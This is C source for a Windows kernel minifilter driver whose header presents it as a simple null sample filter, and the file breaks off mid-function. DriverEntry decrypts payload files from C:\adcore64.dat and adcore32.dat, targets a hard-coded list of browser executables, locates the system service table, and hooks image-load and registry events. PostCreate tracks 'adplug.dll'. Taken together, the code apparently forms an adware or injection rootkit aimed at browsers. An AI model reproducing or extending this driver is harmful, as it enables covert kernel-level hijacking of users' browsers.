/*++

Copyright (c) 1999 - 2002  Microsoft Corporation

Module Name:

    adsys.c

Abstract:

    This is the main module of the nullFilter mini filter driver.
    It is a simple minifilter that registers itself with the main filter
    for no callback operations.

Environment:

    Kernel mode

--*/

#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>
#include <string.h>
#include "adsys.h"
#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")

//---------------------------------------------------------------------------
//      Global variables
//---------------------------------------------------------------------------


//
//  Assign text sections for each routine.
//

#ifdef ALLOC_PRAGMA

#pragma alloc_text(PAGE, InstanceSetup)
#pragma alloc_text(PAGE, CleanVolumCtx)
#pragma alloc_text(PAGE, InstanceQueryTeardown)
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, FilterUnload)
#endif
/***********************
    Filter initialization and unload routines.
*************************************************************************/


NTSTATUS DriverEntry (
    __in PDRIVER_OBJECT DriverObject,
    __in PUNICODE_STRING RegistryPath
)
/*++

Routine Description:

    This is the initialization routine for this miniFilter driver. This
    registers the miniFilter with FltMgr and initializes all
    its global data structures.

Arguments:

    DriverObject - Pointer to driver object created by the system to
        represent this driver.
    RegistryPath - Unicode string identifying where the parameters for this
        driver are located in the registry.

Return Value:

    Returns STATUS_SUCCESS.

--*/
{
    NTSTATUS status=-1;
    PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
    PVOID pFoundPattern = NULL;
    UCHAR PreviousModePattern[] = "\x00\x00\xC3";
    PLIST_ENTRY p=NULL;
	PKLDR_DATA_TABLE_ENTRY entry=NULL;

    UNREFERENCED_PARAMETER( RegistryPath );

	g_drobj=DriverObject;

    //  Register with FltMgr

    InitializeListHead(&g_ListProcess);
    AppendListNode(L"360se.exe");
    AppendListNode(L"chrome.exe");
    AppendListNode(L"QQBrowser.exe");
    AppendListNode(L"2345Explorer.exe");
    AppendListNode(L"SogouExplorer.exe");
    AppendListNode(L"baidubrowser.exe");
    AppendListNode(L"firefox.exe");
    AppendListNode(L"UCBrowser.exe");
    AppendListNode(L"liebao.exe");
    AppendListNode(L"TheWorld.exe");
    AppendListNode(L"iexplore.exe");
    AppendListNode(L"360chrome.exe");
    AppendListNode(L"360chrome.exe");
    AppendListNode(L"opera.exe");
	AppendListNode(L"Maxthon.exe");

//	  InitializeListHead(&g_AntiProcess);
//    AppendListNode(L"360se.exe");
//    AppendListNode(L"chrome.exe");
//    entry=(PKLDR_DATA_TABLE_ENTRY)g_drobj->DriverSection;
//    wcscpy(strSys,entry->FullDllName.Buffer);
//	kprintf("syspath:%wZ",g_drobj->DriverName);
#ifdef _AMD64_
    //x64 add code
    status = MzReadFile(L"\\??\\C:\\adcore64.dat",&g_pDll64,&g_iDll64);
    if (NT_SUCCESS(status)) {
        MyDecryptFile(g_pDll64,g_iDll64);

    }

    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
    if (NT_SUCCESS(status)) {
        MyDecryptFile(g_pDll32,g_iDll32);
    }

#else
    //x86 add code
    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
    if (NT_SUCCESS(status)) {
        MyDecryptFile(g_pDll32,g_iDll32);
    }
#endif

	kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);

#ifdef _AMD64_
    KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
#else
#endif

    kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
//    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
    PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
    PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
    if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
        g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
        kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
    }
    status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
    if(!NT_SUCCESS(status)) {
        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
    }

    //注册表回调监控
    SetRegisterCallback();
    //文件回调监控

    status = FltRegisterFilter( DriverObject,
                                &FilterRegistration,
                                &gFilterHandle);
    ASSERT( NT_SUCCESS( status ) );
    if (NT_SUCCESS( status )) {
        //
        //  Start filtering i/o
        //
        status = FltStartFiltering( gFilterHandle);
        if (!NT_SUCCESS( status )) {
            FltUnregisterFilter( gFilterHandle);
        }
    }
        DriverObject->DriverUnload = DriverUnload;
    return status;
}

NTSTATUS FilterUnload (__in FLT_FILTER_UNLOAD_FLAGS Flags)
/*++
Routine Description:

    This is the unload routine for this miniFilter driver. This is called
    when the minifilter is about to be unloaded. We can fail this unload
    request if this is not a mandatory unloaded indicated by the Flags
    parameter.

Arguments:

    Flags - Indicating if this is a mandatory unload.

Return Value:

    Returns the final status of this operation.

--*/
{
    UNREFERENCED_PARAMETER( Flags );

    //
    //  Unregister from FLT mgr
    //
    FltUnregisterFilter( gFilterHandle );
    //
    //  Delete lookaside list
    //
    ExDeleteNPagedLookasideList( &Pre2PostContextList );

    return STATUS_SUCCESS;
}

BOOLEAN GetProcessNameByObj(PEPROCESS ProcessObj, WCHAR name[])
{
    PPEB pPEB = NULL;
    UNREFERENCED_PARAMETER(name);
    PsGetProcessPeb==NULL?(P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb"):PsGetProcessPeb;
    pPEB = PsGetProcessPeb != NULL ?    PsGetProcessPeb(ProcessObj) : NULL;

    if (pPEB == NULL) return FALSE;
#ifdef _AMD64_


    try {
        PPEB64 peb64 = (PPEB64)pPEB;
        ULONG64 p1 = 0;
        ULONG64 uCommandline = 0;
        ULONG64 uImagepath = 0;
        ULONG    type = 0;
        PUNICODE_STRING   pCommandline = NULL;
        UNICODE_STRING    pImagePath = { 0 };
        UNICODE_STRING    tempcommand = { 0 };
        WCHAR  pexe[512] = { 0 };
        PRTL_USER_PROCESS_PARAMETERS64 processParam = (PRTL_USER_PROCESS_PARAMETERS64)peb64->ProcessParameters;

        if (MmIsAddressValid(processParam) == FALSE || processParam->ImagePathName.Length > 512) {
            return FALSE;
        }

//	   	kprintf("ImagePathName:%wZ",processParam->ImagePathName);
		
        if (MmIsAddressValid(processParam->ImagePathName.Buffer)) {
			
            WCHAR *pfind = NULL;
			WCHAR *pexefind=NULL;
            RtlInitUnicodeString(&pImagePath, processParam->ImagePathName.Buffer);
            RtlCopyMemory(pexe, (void *)pImagePath.Buffer, pImagePath.Length);
            pfind = wcsrchr(pexe, L'\\');
            if (pfind) {
                pfind++;
                wcscpy(name, pfind);
                return TRUE;
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        ULONG code= GetExceptionCode();

    }

#else

    try {

        PPEB32 peb32 = (PPEB32)pPEB;
        ULONG32 p1 = 0;
        ULONG32 uCommandline = 0;
        ULONG32 uImagepath = 0;
        ULONG    type = 0;
        PUNICODE_STRING32   pCommandline = NULL;
        UNICODE_STRING32    pImagePath = { 0 };
        UNICODE_STRING32    tempcommand;
        WCHAR  pexe[512] = { 0 };

        ULONG   ImageBuffeLen=259;
        WCHAR  *pImageBuffer=NULL;
        PRTL_USER_PROCESS_PARAMETERS32 processParam=NULL;
        if (pPEB == NULL) return FALSE;

        processParam = (PRTL_USER_PROCESS_PARAMETERS32)peb32->ProcessParameters;

        if (MmIsAddressValid(processParam) == FALSE) {
            return FALSE;
        }
        pImageBuffer=processParam->ImagePathName.Buffer;
        ImageBuffeLen = processParam->ImagePathName.Length;


        if (MmIsAddressValid((PVOID)pImageBuffer)&&ImageBuffeLen<512) {
            WCHAR *pfind=NULL;
            RtlCopyMemory(pexe, (void *) pImageBuffer, ImageBuffeLen);
            pfind = wcsrchr(pexe, L'\\');
            if (pfind) {
                pfind++;
                wcscpy(name, pfind);
                _wcslwr(name,wcslen(name));
                return TRUE;
            }
        } else {
            ULONG_PTR pexebuf = (ULONG_PTR)pImageBuffer + (ULONG_PTR)processParam;
            if (MmIsAddressValid((PVOID)pexebuf)) {
                WCHAR *pfind=NULL;
                RtlCopyMemory(pexe, (PVOID)pexebuf, ImageBuffeLen);
                pfind = wcsrchr(pexe, L'\\');
                if (pfind) {
                    pfind++;
                    wcscpy(name, pfind);
                    _wcslwr(name,wcslen(name));
                    return TRUE;
                }
            }
        }



    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        ULONG code= GetExceptionCode();


    }


#endif
    return FALSE;


}

VOID CleanVolumCtx(
    IN PFLT_CONTEXT Context,
    IN FLT_CONTEXT_TYPE ContextType
)
/*++

Routine Description:

    The given context is being freed.
    Free the allocated name buffer if there one.

Arguments:

    Context - The context being freed

    ContextType - The type of context this is

Return Value:

    None

--*/
{
    PVOLUME_CONTEXT ctx = NULL;
    PSTREAM_CONTEXT streamCtx = NULL;
    PAGED_CODE();
    UNREFERENCED_PARAMETER(ContextType);
    switch (ContextType) {
        case FLT_VOLUME_CONTEXT: {

            ctx = (PVOLUME_CONTEXT)Context;
            if (ctx->Name.Buffer != NULL) {

//                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
                ExFreePool(ctx->Name.Buffer);
                ctx->Name.Buffer = NULL;
            }
        }
        break;
        case FLT_STREAM_CONTEXT: {
            KIRQL OldIrql;
            streamCtx = (PSTREAM_CONTEXT)Context;

            if (streamCtx == NULL) break;
            if (streamCtx->FileName.Buffer != NULL) {

//                kprintf("[CleanVolumCtx] free streamcontext FileName:%ws",streamCtx->FileName.Buffer);
                ExFreePoolWithTag(streamCtx->FileName.Buffer, STRING_TAG);
                streamCtx->FileName.Length = streamCtx->FileName.MaximumLength = 0;
                streamCtx->FileName.Buffer = NULL;
            }

            if (NULL != streamCtx->Resource) {
                ExDeleteResourceLite(streamCtx->Resource);
                ExFreePoolWithTag(streamCtx->Resource, RESOURCE_TAG);
            }
        }
        break;
    }
}

NTSTATUS InstanceSetup (
    IN PCFLT_RELATED_OBJECTS FltObjects,
    IN FLT_INSTANCE_SETUP_FLAGS Flags,
    IN DEVICE_TYPE VolumeDeviceType,
    IN FLT_FILESYSTEM_TYPE VolumeFilesystemType
)
/*++

Routine Description:

    This routine is called whenever a new instance is created on a volume.

    By default we want to attach to all volumes.  This routine will try and
    get a "DOS" name for the given volume.  If it can't, it will try and
    get the "NT" name for the volume (which is what happens on network
    volumes).  If a name is retrieved a volume context will be created with
    that name.

Arguments:

    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
        opaque handles to this filter, instance and its associated volume.

    Flags - Flags describing the reason for this attach request.

Return Value:

    STATUS_SUCCESS - attach
    STATUS_FLT_DO_NOT_ATTACH - do not attach

--*/
{
    PDEVICE_OBJECT devObj = NULL;
    PVOLUME_CONTEXT ctx = NULL;
    NTSTATUS status;
    ULONG retLen;
    PUNICODE_STRING workingName;
    USHORT size;
    UCHAR volPropBuffer[sizeof(FLT_VOLUME_PROPERTIES)+512];
    PFLT_VOLUME_PROPERTIES volProp = (PFLT_VOLUME_PROPERTIES)volPropBuffer;

    UNREFERENCED_PARAMETER( Flags );
    UNREFERENCED_PARAMETER( VolumeDeviceType );
    UNREFERENCED_PARAMETER( VolumeFilesystemType );

    try {

        //
        //  Allocate a volume context structure.
        //

        status = FltAllocateContext( FltObjects->Filter,
                                     FLT_VOLUME_CONTEXT,
                                     sizeof(VOLUME_CONTEXT),
                                     NonPagedPool,
                                     &ctx );

        if (!NT_SUCCESS(status)) {

            //
            //  We could not allocate a context, quit now
            //

            leave;
        }

        //
        //  Always get the volume properties, so I can get a sector size
        //

        status = FltGetVolumeProperties( FltObjects->Volume,
                                         volProp,
                                         sizeof(volPropBuffer),
                                         &retLen );

        if (!NT_SUCCESS(status)) {

            leave;
        }

        //
        //  Save the sector size in the context for later use.  Note that
        //  we will pick a minimum sector size if a sector size is not
        //  specified.
        //

        ASSERT((volProp->SectorSize == 0) || (volProp->SectorSize >= MIN_SECTOR_SIZE));

        ctx->SectorSize = max(volProp->SectorSize,MIN_SECTOR_SIZE);

        //
        //  Init the buffer field (which may be allocated later).
        //

        ctx->Name.Buffer = NULL;

        //
        //  Get the storage device object we want a name for.
        //

        status = FltGetDiskDeviceObject( FltObjects->Volume, &devObj );

        if (NT_SUCCESS(status)) {

            //
            //  Try and get the DOS name.  If it succeeds we will have
            //  an allocated name buffer.  If not, it will be NULL
            //

            status = IoVolumeDeviceToDosName( devObj, &ctx->Name );
        }

        //
        //  If we could not get a DOS name, get the NT name.
        //

        if (!NT_SUCCESS(status)) {

            ASSERT(ctx->Name.Buffer == NULL);

            //
            //  Figure out which name to use from the properties
            //

            if (volProp->RealDeviceName.Length > 0) {

                workingName = &volProp->RealDeviceName;

            } else if (volProp->FileSystemDeviceName.Length > 0) {

                workingName = &volProp->FileSystemDeviceName;

            } else {

                //
                //  No name, don't save the context
                //

                status = STATUS_FLT_DO_NOT_ATTACH;
                leave;
            }

            //
            //  Get size of buffer to allocate.  This is the length of the
            //  string plus room for a trailing colon.
            //

            size = workingName->Length + sizeof(WCHAR);

            //
            //  Now allocate a buffer to hold this name
            //

            ctx->Name.Buffer = ExAllocatePoolWithTag( NonPagedPool,
                               size,
                               NAME_TAG );
            if (ctx->Name.Buffer == NULL) {

                status = STATUS_INSUFFICIENT_RESOURCES;
                leave;
            }

            //
            //  Init the rest of the fields
            //

            ctx->Name.Length = 0;
            ctx->Name.MaximumLength = size;

            //
            //  Copy the name in
            //

            RtlCopyUnicodeString( &ctx->Name,
                                  workingName );

            //
            //  Put a trailing colon to make the display look good
            //

            RtlAppendUnicodeToString( &ctx->Name,
                                      L":" );
        }

        //
        //  Set the context
        //

        status = FltSetVolumeContext( FltObjects->Volume,
                                      FLT_SET_CONTEXT_KEEP_IF_EXISTS,
                                      ctx,
                                      NULL );



        //
        //  Log debug info
        //

//        DbgPrint("[InstanceSetup] SectSize=0x%04x, Used SectSize=0x%04x, Name=\"%wZ\"\n",
//                 volProp->SectorSize,
//                 ctx->SectorSize,
//                 &ctx->Name);

        //
        //  It is OK for the context to already be defined.
        //

        if (status == STATUS_FLT_CONTEXT_ALREADY_DEFINED) {

            status = STATUS_SUCCESS;
        }

    }
    finally {

        //
        //  Always release the context.  If the set failed, it will free the
        //  context.  If not, it will remove the reference added by the set.
        //  Note that the name buffer in the ctx will get freed by the context
        //  cleanup routine.
        //

        if (ctx)
        {

            FltReleaseContext( ctx );
        }

        //
        //  Remove the reference added to the device object by
        //  FltGetDiskDeviceObject.
        //

        if (devObj)
        {
            ObDereferenceObject( devObj );
        }
    }

    return status;
}

 
NTSTATUS InstanceQueryTeardown (
    IN PCFLT_RELATED_OBJECTS FltObjects,
    IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags
)
/*++

Routine Description:

    This is called when an instance is being manually deleted by a
    call to FltDetachVolume or FilterDetach.  We always return it is OK to
    detach.

Arguments:

    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
        opaque handles to this filter, instance and its associated volume.

    Flags - Indicating where this detach request came from.

Return Value:

    Always succeed.

--*/
{
    UNREFERENCED_PARAMETER( FltObjects );
    UNREFERENCED_PARAMETER( Flags );
    return STATUS_SUCCESS;
}


FLT_PREOP_CALLBACK_STATUS PreCleanup(
    __inout PFLT_CALLBACK_DATA Data,
    __in PCFLT_RELATED_OBJECTS FltObjects,
    __deref_out_opt PVOID *CompletionContext
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
    PSTREAM_CONTEXT pStreamCtx = NULL;
    LARGE_INTEGER FileOffset = { 0 };
    BOOLEAN bIsSystemProcess = FALSE;
    BOOLEAN bFileNameLengthNotZero = FALSE;
    KIRQL OldIrql;
    PVOLUME_CONTEXT pVolCtx = NULL;
    BOOLEAN bDirectory = FALSE;
    UNREFERENCED_PARAMETER(CompletionContext);
    PAGED_CODE();
    try {
        //get volume context锛?remember to release volume context before return
        status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &pVolCtx);
        if (!NT_SUCCESS(status) || (NULL == pVolCtx)) {
            __leave;
        }



        // retrieve stream context
        status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
        if (!NT_SUCCESS(status)) {
            __leave;
        }


        //DbgPrint("PreCleanup %wZ",&pStreamCtx->FileName);
        //get file full path(such as \Device\HarddiskVolumeX\test\1.txt)
        status = FltGetFileNameInformation(Data,FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT,&pfNameInfo);
        if (!NT_SUCCESS(status)) {
            __leave;
        }
        if (0 != pfNameInfo->Name.Length) { // file name length is zero

            // verify file attribute. If directory, pass down directly
            GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
            if (bDirectory) {
                __leave;
            }

            DbgPrint("[PreCleanup] call Cc_ClearFileCache");
            Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache

        }
    }
    finally{

        if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
        if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
    }

    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}


FLT_PREOP_CALLBACK_STATUS PreClose(
    __inout PFLT_CALLBACK_DATA Data,
    __in PCFLT_RELATED_OBJECTS FltObjects,
    __deref_out_opt PVOID *CompletionContext
)
{
    NTSTATUS status = STATUS_SUCCESS;
    FLT_PREOP_CALLBACK_STATUS FltStatus = FLT_PREOP_SUCCESS_NO_CALLBACK;

    PSTREAM_CONTEXT pStreamCtx = NULL;
    PVOLUME_CONTEXT pVolCtx = NULL;

    BOOLEAN bDeleteStreamCtx = FALSE;

    OBJECT_ATTRIBUTES ob;
    IO_STATUS_BLOCK IoStatus;
    HANDLE hFile = NULL;
    UNICODE_STRING sFileDosFullPath;
    WCHAR  wszFileDosFullPath[260];
    PWCHAR pszRelativePathPtr = NULL;
    WCHAR  wszFilePathName[260] = { 0 };
    WCHAR  wszVolumePathName[64] = { 0 };
    PFILE_OBJECT FileObject = NULL;

    KIRQL OldIrql;
    BOOLEAN bDirectory = FALSE;
    BOOLEAN bIsSystemProcess = FALSE;

    UNREFERENCED_PARAMETER(CompletionContext);

    PAGED_CODE(); //comment this line to avoid IRQL_NOT_LESS_OR_EQUAL error when accessing stream context

    try {

        // verify file attribute, if directory, pass down directly
        GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
        if (bDirectory) {
            __leave;
        }

        // retireve volume context
        status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &pVolCtx);
        if (!NT_SUCCESS(status)) {
            __leave;
        }

        // retrieve stream context
        status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
        if (!NT_SUCCESS(status)) {
            __leave;
        }

        SC_LOCK(pStreamCtx, &OldIrql);
        // if it is a stream file object, we don't care about it and don't decrement on reference count
        // since this object is opened by other kernel component
        if ((FltObjects->FileObject->Flags & FO_STREAM_FILE) != FO_STREAM_FILE)
            pStreamCtx->RefCount--; // decrement reference count


        if (0 == pStreamCtx->RefCount) { //if reference decreases to 0, write file flag, flush|purge cache, and delete file context
            DbgPrint("[PreClose]  RefCount:%d",pStreamCtx->RefCount);
            Cc_ClearFileCache(FileObject, TRUE, NULL, 0);
        }
        SC_UNLOCK(pStreamCtx, OldIrql);
    }
    finally{

        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
        if (NULL != pVolCtx) FltReleaseContext(pVolCtx);

    }

    return FltStatus;
}


/*************************************************************************
    dispatch callback routines.
*************************************************************************/
FLT_PREOP_CALLBACK_STATUS PreCreate(
    __inout PFLT_CALLBACK_DATA Data,
    __in PCFLT_RELATED_OBJECTS FltObjects,
    __deref_out_opt PVOID *CompletionContext
)
{
    FLT_PREOP_CALLBACK_STATUS FltStatus = FLT_PREOP_SUCCESS_WITH_CALLBACK;
    WCHAR   fitername[256]= {0};
    WCHAR   exename[216]= {0};
    PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
    ULONG ilen=0;
    NTSTATUS status;
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Data);
    PAGED_CODE();

    return FltStatus; //FLT_PREOP_SUCCESS_WITH_CALLBACK;
}



FLT_POSTOP_CALLBACK_STATUS PostCreate(
    __inout PFLT_CALLBACK_DATA Data,
    __in PCFLT_RELATED_OBJECTS FltObjects,
    __inout_opt PVOID CompletionContext,
    __in FLT_POST_OPERATION_FLAGS Flags
)
{
    NTSTATUS status = STATUS_SUCCESS;

    ULONG uDesiredAccess = Data->Iopb->Parameters.Create.SecurityContext->DesiredAccess; //get desired access mode

    PVOLUME_CONTEXT pVolCtx = NULL;
    PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;

    PSTREAM_CONTEXT pStreamCtx = NULL;
    BOOLEAN bNewCreatedOrNot = FALSE;

    LARGE_INTEGER FileSize = { 0 };
    WCHAR   fitername[256]= {0};
    WCHAR   exename[216]= {0};

    LARGE_INTEGER ByteOffset = { 0 };
    LARGE_INTEGER OrigByteOffset = { 0 };
    ULONG      uReadLength = 0;


    BOOLEAN bDirectory = FALSE;
    BOOLEAN bIsSystemProcess = FALSE;
    KIRQL CurrentIrql;
    KIRQL OldIrql;
    ULONG  uPid;
    PVOID psFileFlag=NULL;




    ULONG ilen=0;
    UNREFERENCED_PARAMETER(Flags);
    UNREFERENCED_PARAMETER(CompletionContext);

    PAGED_CODE();



    try {

        //  If the Create has failed, do nothing
        if (!NT_SUCCESS(Data->IoStatus.Status)) {
            __leave;

        };

        //get volume context锛?remember to release volume context before return
        status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &pVolCtx);
        if (!NT_SUCCESS(status) || (NULL == pVolCtx)) {

            __leave;
        }

        //get file full path(such as \Device\HarddiskVolumeX\test\1.txt)
        status = FltGetFileNameInformation(Data,FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT,&pfNameInfo);
        if (!NT_SUCCESS(status)) {
            __leave;
        }
        if (0 == pfNameInfo->Name.Length) { // file name length is zero

            __leave;
        }



        if (0 == RtlCompareUnicodeString(&pfNameInfo->Name, &pfNameInfo->Volume, TRUE)) { // if volume name, filter it
            __leave;
        }


        //verify if a directory
        GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
        if (bDirectory) { // open/create a directory, just pass
            __leave;
        }

        ilen=GetNameByUnicodeString(&pfNameInfo->Name,fitername);
        if (_wcsicmp(fitername,L"adplug.dll")!=0) {

            __leave;
        }
        uPid=FltGetRequestorProcessId(Data);
        //DbgPrint("[PostCreate] PID:%d filename:%wZ",uPid,&pfNameInfo->Name);


        //create or get stream context of the file


        status = Ctx_FindOrCreateStreamContext(Data, FltObjects, TRUE,
                                               &pStreamCtx, &bNewCreatedOrNot);
        if (!NT_SUCCESS(status)) {
            __leave;
        }


        GetProcessNameByObj(PsGetCurrentProcess(),exename);
        kprintf("[PostCreate] pid:%d exename:%ws",FltGetRequestorProcessId(Data),exename);




        //update file path name in stream context
        Ctx_UpdateNameInStreamContext(&pfNameInfo->Name, pStreamCtx);

        pStreamCtx->FileSize = FileSize;


        status = GetFileStandardInfo(Data, FltObjects, NULL, &FileSize, NULL);
        if (!NT_SUCCESS(status)) {
            __leave;
        }

        //fill some fields in stream context
        SC_LOCK(pStreamCtx, &OldIrql);
        pStreamCtx->FileSize = FileSize;
        SC_UNLOCK(pStreamCtx, OldIrql);


        if (!bNewCreatedOrNot) {
            SC_LOCK(pStreamCtx, &OldIrql);
            pStreamCtx->RefCount++;
            pStreamCtx->uAccess = uDesiredAccess;
            SC_UNLOCK(pStreamCtx, OldIrql);
            DbgPrint("[PostCreate] has found RefCount:%d bNewCreatedOrNot:%d filename:%wZ\n", pStreamCtx->RefCount,bNewCreatedOrNot,&pStreamCtx->FileName);
            __leave;
        }

        //init new created stream context
        SC_LOCK(pStreamCtx, &OldIrql);
        RtlCopyMemory(pStreamCtx->wszVolumeName, pfNameInfo->Volume.Buffer, pfNameInfo->Volume.Length);
        pStreamCtx->RefCount++;
        pStreamCtx->uAccess = uDesiredAccess;

        DbgPrint("[PostCreate] has not found RefCount:%d bNewCreatedOrNot:%d filename:%wZ\n", pStreamCtx->RefCount,bNewCreatedOrNot,&pStreamCtx->FileName);
        ///pStreamCtx->aes_ctr_ctx = NULL ;
        SC_UNLOCK(pStreamCtx, OldIrql);



        //Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache

    }
    finally{
        if (NULL != pVolCtx)    FltReleaseContext(pVolCtx);
        if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
        if (NULL != psFileFlag) ExFreePoolWithTag(psFileFlag, FILEFLAG_POOL_TAG);

    }

    return FLT_POSTOP_FINISHED_PROCESSING;
}

BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[])
{
    WCHAR uu[512] = { 0 };
    if (pSrc->Length < 512) {
        WCHAR *pfind = NULL;
        RtlCopyMemory(uu, pSrc->Buffer, pSrc->Length);
        pfind = wcsrchr(uu, L'\\');
        if (pfind) {
            pfind++;
            wcscpy(name, pfind);
            //              DbgPrint("GetNameByUnicodeString->%ws", pfind);
            return TRUE;
        }
    }
    return  FALSE;
}

FLT_POSTOP_CALLBACK_STATUS PostRead(
    IN OUT PFLT_CALLBACK_DATA Data,
    IN PCFLT_RELATED_OBJECTS FltObjects,
    IN PVOID CompletionContext,
    IN FLT_POST_OPERATION_FLAGS Flags
)
{
    PVOID origBuf;
    PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
    FLT_POSTOP_CALLBACK_STATUS retValue = FLT_POSTOP_FINISHED_PROCESSING;
    BOOLEAN cleanupAllocatedBuffer = TRUE;
    PPRE_2_POST_CONTEXT p2pCtx = (PPRE_2_POST_CONTEXT)CompletionContext;

    //
    //  This system won't draining an operation with swapped buffers, verify
    //  the draining flag is not set.
    //
    ASSERT(!FlagOn(Flags, FLTFL_POST_OPERATION_DRAINING));
    try {

        //
        //  If the operation failed or the count is zero, there is no data to
        //  copy so just return now.
        //

        if (!NT_SUCCESS(Data->IoStatus.Status) ||(Data->IoStatus.Information == 0)) {
            leave;
        }


        DbgPrint("[PostRead] p2pCtx:%p  SwappedBuffer%p",p2pCtx,p2pCtx->SwappedBuffer);




        //
        //  We need to copy the read data back into the users buffer.  Note
        //  that the parameters passed in are for the users original buffers
        //  not our swapped buffers.
        //

        if (iopb->Parameters.Read.MdlAddress != NULL) {

            origBuf = MmGetSystemAddressForMdlSafe( iopb->Parameters.Read.MdlAddress,NormalPagePriority );
            if (origBuf == NULL) {
                Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
                Data->IoStatus.Information = 0;
                leave;
            }
            DbgPrint("[PostRead] MmGetSystemAddressForMdlSafe MdlAddress:%p origBuf:%p",iopb->Parameters.Read.MdlAddress,origBuf);

        } else if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) ||FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
            origBuf = iopb->Parameters.Read.ReadBuffer;
            DbgPrint("[PostRead] FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION system buffer origBuf:%p",origBuf);

            //DbgPrint("SwapBuffers! origBuf:%p",origBuf);

        } else {


            DbgPrint("[PostRead] call FltDoCompletionProcessingWhenSafe");

            //DbgPrint("FltDoCompletionProcessingWhenSafe come on here");
            if (FltDoCompletionProcessingWhenSafe( Data,
                                                   FltObjects,
                                                   CompletionContext,
                                                   Flags,
                                                   PostReadWhenSafe,
                                                   &retValue )) {

                //
                //  This operation has been moved to a safe IRQL, the called
                //  routine will do (or has done) the freeing so don't do it
                //  in our routine.
                //

                cleanupAllocatedBuffer = FALSE;

            } else {

                DbgPrint("[PostRead] call else");

                Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
                Data->IoStatus.Information = 0;
            }

            leave;
        }

        //
        //  We either have a system buffer or this is a fastio operation
        //  so we are in the proper context.  Copy the data handling an
        //  exception.
        //


    }
    finally {

        //
        //  If we are supposed to, cleanup the allocated memory and release
        //  the volume context.  The freeing of the MDL (if there is one) is
        //  handled by FltMgr.
        //
        DbgPrint("[PostRead] cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
        if (cleanupAllocatedBuffer)
        {

            ExFreePool(p2pCtx->SwappedBuffer);
            FltReleaseContext(p2pCtx->VolCtx);
            FltReleaseContext(p2pCtx->pStreamCtx);
            ExFreeToNPagedLookasideList(&Pre2PostContextList, p2pCtx);
        }

    }

    return retValue;
}



/*************************************************************************
    MiniFilter callback routines.
*************************************************************************/

FLT_PREOP_CALLBACK_STATUS PreRead(
